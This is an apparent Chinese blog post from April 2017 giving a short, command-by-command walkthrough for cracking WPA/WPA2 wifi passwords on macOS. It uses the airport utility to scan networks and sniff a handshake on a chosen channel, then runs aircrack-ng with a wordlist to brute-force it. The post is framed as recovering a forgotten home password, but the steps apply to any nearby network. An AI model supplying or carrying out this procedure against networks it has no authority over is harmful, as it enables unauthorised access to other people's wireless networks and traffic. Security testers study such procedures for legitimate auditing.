<article class="post">
  April 10, 2017
  

  <h1 class="post-title">macOS破解WPA/WPA2 wifi密码</h1>
  <section class="post-content article-entry">
    <h2 id="你家wifi密码忘记了怎么办？看我的"><a href="#你家wifi密码忘记了怎么办？看我的" class="headerlink" title="你家wifi密码忘记了怎么办？看我的"></a>你家wifi密码忘记了怎么办？看我的</h2><ul>
<li><p>安装aircrack-ng</p>
</li>
<li><p>查看周围wifi</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport <span class="_">-s</span></div></pre></td></tr></table></figure>
<ul>
<li>等待连接 获取握手包</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport en0 sniff 6</div><div class="line"><span class="comment">#en0为你的无线网卡 通过ifconfig查看 </span></div><div class="line"><span class="comment">#6为需要破解的wifi channel,通过上一条命令获得</span></div></pre></td></tr></table></figure>
<ul>
<li><p>control + c , 抓的包保存在/tmp</p>
</li>
<li><p>暴力破解</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">aircrack-ng -w 字典.txt -b BBSID来自第一条命令 握手包目录</div></pre></td></tr></table></figure>
<ul>
<li>等吧,接下来你的字典了</li>
</ul>

  </section>
